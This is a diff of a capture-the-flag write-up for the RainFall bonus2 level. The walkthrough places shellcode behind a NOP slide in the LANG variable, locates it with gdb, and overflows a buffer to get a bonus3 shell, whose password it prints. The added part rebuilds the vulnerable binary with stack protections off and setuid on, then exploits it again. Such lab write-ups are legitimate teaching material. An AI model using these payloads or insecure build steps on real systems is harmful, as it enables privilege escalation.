@@ -84,7 +84,7 @@ bonus2@RainFall:~$ export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0
 
 ### Find exploit address
 
-Find the address of NOP slide in the env language variable with gdb. Create a break point at getenv("LANG"), run and examine the memory.
+Find the address of NOP slide in the env language variable with gdb. Create a break point at ```getenv("LANG")```, run and examine the memory.
 ```
 bonus2@RainFall:~$ gdb -q bonus2
 ...
@@ -101,7 +101,7 @@ We find our exploit stored after the language var starting at ```0xbffffe79```. 
 ### Build overflow string
 
 So, we build our first argument:
-1. 40 bytes padding - ```$(python -c 'print "A" * 40')```
+* 40 bytes padding - ```$(python -c 'print "A" * 40')```
 
 And our second argument:
 1. 18 bytes padding (23 if Dutch) - ```$(python -c 'print "B" * 18')```
@@ -114,4 +114,43 @@ $ whoami
 bonus3
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
+## Recreate Exploited Binary
+
+As user ```bonus3```, in ```/tmp```, create and compile ```bonus2_source.c```
+```
+bonus3@RainFall:/tmp$ gcc bonus2_source.c -fno-stack-protector -z execstack -o bonus2_source
+```
+
+Edit permissions including suid, then move the binary to home directory.
+```
+bonus3@RainFall:/tmp$ chmod u+s bonus2_source; chmod +wx ~; mv bonus2_source ~
+```
+
+Exit back to user ```bonus2```, then provide our exploit as argument to the source. Luckily, the env language var address is similar, so the return address doesn't need updating.
+```
+bonus3@RainFall:/tmp$ exit
+exit
+bonus2@RainFall:~$ /home/user/bonus3/bonus2_source $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xa3\xfe\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
+$ whoami
+bonus3
+```
+
+To find the new env language variable with gdb. Find the addess of ```getenv("LANG")``` in ```main``` and create a break point, run and examine the memory.
+```
+bonus2@RainFall:~$ gdb -q bonus2
+...
+(gdb) disas main
+...
+   0x080485d2 <+131>:	call   0x80483a0 <getenv@plt>
+...
+(gdb) break *main+131
+...
+(gdb) run first_name second_name
+...
+(gdb) x/19s *((char**)environ)
+...
+0xbffffe72:	 "LANG=fi\220\220...
 ```
